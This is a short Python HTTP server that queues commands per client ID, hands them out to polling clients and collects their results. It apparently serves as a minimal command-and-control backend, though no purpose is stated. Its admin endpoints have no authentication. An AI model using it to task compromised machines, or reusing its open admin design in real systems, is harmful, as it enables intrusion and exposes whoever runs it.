from http.server import BaseHTTPRequestHandler, HTTPServer
import json

commands = {}
results = {}

class RequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data)

        if self.path == '/send_result':
            client_id = data['client_id']
            result = data['result']
            if client_id in results:
                results[client_id].append(result)
            else:
                results[client_id] = [result]
            self._send_response(200, {"message": "Result received"})

        elif self.path == '/admin/send_command':
            client_id = data['client_id']
            command = data['command']
            if client_id in commands:
                commands[client_id].append(command)
            else:
                commands[client_id] = [command]
            self._send_response(200, {"message": "Command sent"})

    def do_GET(self):
        if self.path.startswith('/get_command'):
            client_id = self.path.split('client_id=')[1]
            if client_id in commands and commands[client_id]:
                command = commands[client_id].pop(0)
                self._send_response(200, {"command": command})
            else:
                self._send_response(200, {"command": ""})

        elif self.path.startswith('/admin/get_results'):
            client_id = self.path.split('client_id=')[1]
            if client_id in results:
                self._send_response(200, {"results": results[client_id]})
            else:
                self._send_response(200, {"results": []})

    def _send_response(self, status, response):
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode('utf-8'))

def run(server_class=HTTPServer, handler_class=RequestHandler, port=5000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting server on port {port}...')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
